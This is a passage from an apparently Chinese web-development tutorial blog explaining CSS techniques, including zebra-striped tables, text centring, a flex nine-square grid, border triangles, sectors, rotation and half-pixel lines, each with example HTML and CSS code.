/*清处浏览器默认设置*/</span><br><span class="line"> &#125;</span><br><span class="line"> table&#123;</span><br><span class="line">  /*表格的外边距和大小*/</span><br><span class="line">  margin: 10px 0 0 0;</span><br><span class="line">  width: 100%;</span><br><span class="line">  border-spacing: 0;</span><br><span class="line">  border-collapse: collapse;</span><br><span class="line">  /*collapse 表格单元格边框合并 </span><br><span class="line">   border-spacing 表格单元格间距为零</span><br><span class="line">  */</span><br><span class="line"> &#125;</span><br><span class="line"> caption&#123;</span><br><span class="line">  font: 30px &quot;楷体&quot;;</span><br><span class="line">  padding: 5px;</span><br><span class="line">  /*表格标题*/</span><br><span class="line"> &#125;</span><br><span class="line"> td&#123;</span><br><span class="line">  width: 32%;</span><br><span class="line">  height: 50px;</span><br><span class="line">  /*单元格大小*/</span><br><span class="line"> &#125;</span><br><span class="line"> tbody td&#123;</span><br><span class="line">   border: 1px solid;</span><br><span class="line">   /*表格主体的边框*/</span><br><span class="line"> &#125;</span><br><span class="line"> thead&#123;</span><br><span class="line">  background-color: #A2A5A7;</span><br><span class="line">  /*表格头部*/</span><br><span class="line"> &#125;</span><br><span class="line"> tr:hover&#123;</span><br><span class="line">  background-color: #66D9EF;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">  /*鼠标悬停在表格上时，表格的背景和鼠标的形状*/</span><br><span class="line"> &#125;</span><br><span class="line"> table tbody tr:nth-child(even)&#123;</span><br><span class="line">  background-color: #8F908A;</span><br><span class="line">  box-shadow: inset 0 5px rgba(255,255,255,0.5);</span><br><span class="line">  /*even为偶数行 odd为奇数行</span><br><span class="line">    设置表格的主体部分偶数行的样式</span><br><span class="line">    shadow 阴影  inset将外部阴影改为内部阴影</span><br><span class="line">  */</span><br><span class="line"> &#125;</span><br><span class="line"> thead tr th:first-child</span><br><span class="line"> &#123;</span><br><span class="line">  /*表头部分th 第一个th左上角设置圆角*/</span><br><span class="line">  border-radius: 15px 0 0 0;</span><br><span class="line"> &#125;</span><br><span class="line"> thead tr td:last-child&#123;</span><br><span class="line">  /*最后一个单元格右上角设置圆角*/</span><br><span class="line">  border-radius: 0 15px 0 0;</span><br><span class="line"> &#125;</span><br><span class="line"> &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;table&gt;</span><br><span class="line"> &lt;caption&gt;斑马线表格&lt;/caption&gt;</span><br><span class="line"> &lt;thead&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;th&gt;&lt;/th&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line"> &lt;/thead&gt;</span><br><span class="line"> &lt;tbody&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line"> &lt;/tbody&gt;</span><br><span class="line">  &lt;tfoot&gt;</span><br><span class="line">   &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;/tr&gt;</span><br><span class="line">  &lt;/tfoot&gt;</span><br><span class="line"> &lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="文本元素如何居中"><a href="#文本元素如何居中" class="headerlink" title="文本元素如何居中"></a>文本元素如何居中</h1><ol><li>CSS设置文字水平居中</li></ol><p>在CSS中可以使用text-align属性来设置文字水平居中。该属性规定元素中的文本的水平对齐方式，通过使用center值设置文本居中。<br>text-align是一个基本的属性，它会影响一个元素中的文本行互相间的对齐方式。值left、right和center会导致元素中的文本分别左对齐、右对齐和居中，想要使文本居中，直接使用center即可。<br><strong>该属性设置文本和img标签等一些内联对象（或与之类似的元素）的居中</strong>。<br><strong>该属性有如下几个特点：</strong></p><ul><li>text-align的center应用在一个容器上，它只针对容器里面的文字以及容器里面的display为inline或者inline-block的容器，<font color="#FF00FF">如果里面的容器display为block，则里面的容器的内容不会居中</font>。</li><li>text-align<font color="#FF00FF">具有向下传递性，会不断地向子元素传递。如果设置一个div，则其子div中的内容也会居中</font>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;css 水平居中&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            .box &#123;</span><br><span class="line">                width: 400px;</span><br><span class="line">                height: 100px;</span><br><span class="line">                background: pink;</span><br><span class="line">                text-align:center;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;box&quot;&gt;css 水平居中了--文本文字&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>CSS设置字体垂直居中</li></ol><p><strong>单行文字垂直居中</strong><br>对于单行文本，我们只需要将文本行高(line-height属性)和所在区域高度(height)设置一致就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;css 垂直居中&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            .box &#123;</span><br><span class="line">                width: 300px;</span><br><span class="line">                height: 300px;</span><br><span class="line">                background: paleturquoise;</span><br><span class="line">                line-height:300px;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;box&quot;&gt;css 垂直居中了--文本文字&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>多行文本垂直居中</strong><br>说明：多行文本垂直居中分为两种情况，一个是父级元素高度不固定，随着内容变化；另一个是父级元素高度固定。</p><ul><li>父级元素高度不固定</li></ul><p>父级高度不固定的时，高度只能通过内部文本来撑开。所以，我们可以通过设置内填充（padding）的值来使文本看起来垂直居中<font color="#FF00FF">，只需设置padding-top和padding-bottom的值相等</font>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;css 垂直居中&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            .box &#123;</span><br><span class="line">                width: 300px;</span><br><span class="line">                margin: 50px auto;</span><br><span class="line">                background: paleturquoise;</span><br><span class="line">                padding: 50px 20px;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;box&quot;&gt;css 垂直居中了--文本文字,文本文字,文本文字,文本文字,文本文字,文本文字&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>父级元素高度固定</li></ul><p><font color="#FF00FF">使用vertical-align:middle +display:table-cell 使文字垂直居中</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;css 垂直居中&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .box &#123;</span><br><span class="line">        width: 300px;</span><br><span class="line">        height: 300px;</span><br><span class="line">        background: paleturquoise;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">        display: table-cell;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">      css 垂直居中了--文本文字,文本文字,文本文字,文本文字,文本文字,文本文字。</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>说明：vertical-align:middle +display:table-cell能够使单行文字、多行文字都居中。<font color="#FF00FF">但是因为 table-cell 是 inline 类型，所以会导致原来的块级元素每个 div 一行移动到了同一行。如果需要分列两行，需要在外面额外添加容器对位置进行控制</font></p></blockquote><h1 id="用flex实现九宫格讲思路"><a href="#用flex实现九宫格讲思路" class="headerlink" title="用flex实现九宫格讲思路"></a>用flex实现九宫格讲思路</h1><blockquote><p>利用了padding-top和flex-wrap:wrap，当设置background-color时，是包括盒子模型中的content和padding的，但是为什么不设置height呢？因为父元素没有高度，所以定义height:30%是没有用的，且若想每个block都为正方形，最好的方式就是设置padding-top/padding-bottom：a%，因为此时的百分比是父元素宽度的百分比，而width也为父元素宽度的百分比，所以block可以成为正方形。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .block &#123;</span><br><span class="line">      padding-top: 30%;</span><br><span class="line">      margin-top: 3%;</span><br><span class="line">      border-radius: 10%;</span><br><span class="line">      background-color: orange;</span><br><span class="line">      width: 30%;</span><br><span class="line">    &#125;</span><br><span class="line">    .container-flex2 &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      flex-wrap: wrap;</span><br><span class="line">      justify-content: space-around;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container-flex2&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="CSS实现一个等腰三角形"><a href="#CSS实现一个等腰三角形" class="headerlink" title="CSS实现一个等腰三角形"></a>CSS实现一个等腰三角形</h1><p>主要是通过把宽高设置成0，边框宽度设置宽一些，设置其中三个边透明，只留一个边显示</p><p>等边三角形是特殊的等腰三角形，它的三条边都相等，顶角为60度，而高是边长的3^(1/2)/2倍，约等于0.866……假设底为160px，则高约为138.56px，因此要做边长为160px的等边三角形，可以这么做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;测试&lt;/title&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">        div &#123;</span><br><span class="line">             width:0px;height:0px;margin:100px auto;</span><br><span class="line">             border-left:80px solid transparent; </span><br><span class="line">             border-right:80px solid transparent; </span><br><span class="line">             border-bottom:138.56px solid #A962CE; /*--三角形的高--*/</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>扩展：</strong></p><p>用CSS实现一个等边三角形：<br>根据各个边之间的长度关系，我们易知：需要展示的边框的宽度：相邻的透明的边框的宽度 = √3 ：1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.triangle&#123;</span><br><span class="line">    width: 0px;</span><br><span class="line">    height: 0px;</span><br><span class="line">    border-left: 10px solid transparent;</span><br><span class="line">    border-right: 10px solid transparent;;</span><br><span class="line">    border-top: 17.32px solid transparent;</span><br><span class="line">    border-bottom: 17.32px solid red; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实现扇形、圆形"><a href="#实现扇形、圆形" class="headerlink" title="实现扇形、圆形"></a>实现扇形、圆形</h1><ol><li>圆形：</li></ol><p>border-radius圆角的四个值按顺序取值分别为：左上、右上、右下、左下。这里只设置一个值，代表四个角的取值都为为50%</p><p>原理：border-radius: 50% 弯曲元素的边框以创建圆。<br>由于圆在任何给定点具有相同的半径，故宽和高都需要保证一样的值，不同的值将创建椭圆。<br>2. 扇形：</p><ul><li> 利用border-radius，实现90度角的扇形：</li></ul><p>原理：<br>左上角是圆角，其余三个角都是直角：左上角的值为宽和高一样的值，其他三个角的值不变（等于0）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;sector&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .sector &#123;</span><br><span class="line">        border-radius: 80px 0 0;</span><br><span class="line">        width: 80px;</span><br><span class="line">        height: 80px;</span><br><span class="line">        background: #666;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/style&gt;</span><br></pre></td></tr></table></figure><p><strong>绘制任意角度的扇形</strong></p><p><img src="http://files.shanqianche.cn/20228/1659669167367.png" alt="任意角度扇形"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">    &lt;div class=&quot;shanxing shanxing1&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!--*绘制一个85度扇形*/--p&gt;</span><br><span class="line">&lt;div class=&quot;shanxing shanxing2&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">     &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!--*绘制一个向右扇形，90度扇形*--&gt;</span><br><span class="line">    &lt;div class=&quot;shanxing shanxing3&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!--*绘制一个颜色扇形 */--p&gt;</span><br><span class="line">&lt;div class=&quot;shanxing shanxing4&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">     &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!--/*绘制一个不同颜色半圆夹角 */--&gt;</span><br><span class="line">    &lt;div class=&quot;shanxing shanxing5&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .shanxing&#123;</span><br><span class="line">          position: relative;</span><br><span class="line">          width: 200px;</span><br><span class="line">          height: 200px;</span><br><span class="line">          border-radius: 100px;</span><br><span class="line">          background-color: yellow;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      .sx1&#123;</span><br><span class="line">          position: absolute;</span><br><span class="line">          width: 200px;</span><br><span class="line">          height: 200px;</span><br><span class="line">          transform: rotate(0deg);</span><br><span class="line">          clip: rect(0px,100px,200px,0px); /*这个clip属性用来绘制半圆，在clip的rect范围内的内容显示出来，使用clip属性，元素必须是absolute的 */</span><br><span class="line">          border-radius: 100px;</span><br><span class="line">          background-color: #f00;</span><br><span class="line">          /*-webkit-animation: an1 2s infinite linear; */</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      .sx2&#123;</span><br><span class="line">          position: absolute;</span><br><span class="line">          width: 200px;</span><br><span class="line">          height: 200px;</span><br><span class="line">          transform: rotate(0deg);</span><br><span class="line">          clip: rect(0px,100px,200px,0px);</span><br><span class="line">          border-radius: 100px;</span><br><span class="line">          background-color: #f00;</span><br><span class="line">          /*-webkit-animation: an2 2s infinite linear;*/</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个60度扇形*/</span><br><span class="line">      .shanxing1 .sx1&#123;transform: rotate(-30deg);&#125;</span><br><span class="line">      .shanxing1 .sx2&#123;transform: rotate(-150deg);&#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个85度扇形*/</span><br><span class="line">      .shanxing2 .sx1&#123;transform: rotate(-45deg);&#125;</span><br><span class="line">      .shanxing2 .sx2&#123;transform: rotate(-140deg);&#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个向右扇形，90度扇形*/</span><br><span class="line">      .shanxing3 .sx1&#123;transform: rotate(45deg);&#125;</span><br><span class="line">      .shanxing3 .sx2&#123;transform: rotate(-45deg);&#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个颜色扇形 */</span><br><span class="line">      .shanxing4 .sx1&#123;transform: rotate(45deg);background-color: #fff;&#125;</span><br><span class="line">      .shanxing4 .sx2&#123;transform: rotate(-45deg);background-color: #fff;&#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个不同颜色半圆夹角 */</span><br><span class="line">      .shanxing5 .sx1&#123;transform: rotate(45deg);background-color: #f00;&#125;</span><br><span class="line">      .shanxing5 .sx2&#123;transform: rotate(-45deg);background-color: #0f0;</span><br><span class="line">    &lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="旋转45度"><a href="#旋转45度" class="headerlink" title="旋转45度"></a>旋转45度</h1><p><strong>CSS中使用rotate方法来实现对元素的旋转，在参数中加入角度值，旋转方式为顺时针旋转。</strong></p><p><img src="http://files.shanqianche.cn/20228/1659669277112.png" alt="旋转"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;Transform旋转&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      div &#123;</span><br><span class="line">        width: 300px;</span><br><span class="line">        margin: 150px auto;</span><br><span class="line">        background-color: yellow;</span><br><span class="line">        text-align: center;</span><br><span class="line">        -webkit-transform: rotate(45deg); /* for Chrome || Safari */</span><br><span class="line">        -moz-transform: rotate(45deg); /* for Firefox */</span><br><span class="line">        -ms-transform: rotate(45deg); /* for IE */</span><br><span class="line">        -o-transform: rotate(45deg); /* for Opera */</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div&gt;黄色div&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="画-0-5px-的直线"><a href="#画-0-5px-的直线" class="headerlink" title="画 0.5px 的直线"></a>画 0.5px 的直线</h1><h2 id="使用scale缩放"><a href="#使用scale缩放" class="headerlink" title="使用scale缩放"></a>使用scale缩放</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.hr.scale-half &#123;</span><br><span class="line">    height: 1px;</span><br><span class="line">    transform: scaleY(0.5);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">    &lt;p&gt;1px + scaleY(0.5)&lt;/p&gt;</span><br><span class="line">    &lt;div class=&quot;hr scale-half&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="http://files.shanqianche.cn/20228/1659669346282.png" alt="效果"><br><strong>Chrome/Safari都变虚了，只有Firefox比较完美看起来是实的而且还很细，效果和直接设置0.5px一样。</strong> 所以通过transform: scale会导致Chrome变虚了，而粗细几乎没有变化。但是如果加上transform-origin: 50% 100%：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.hr.scale-half &#123;</span><br><span class="line">    height: 1px;</span><br><span class="line">    transform: scaleY(0.5);</span><br><span class="line">    transform-origin: 50% 100%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chrome现在的效果如下</p><p><img src="http://files.shanqianche.cn/20228/1659669651765.png" alt="chrome"></p><h2 id="线性渐变linear-gradient"><a href="#线性渐变linear-gradient" class="headerlink" title="线性渐变linear-gradient"></a>线性渐变linear-gradient</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.hr.gradient &#123;</span><br><span 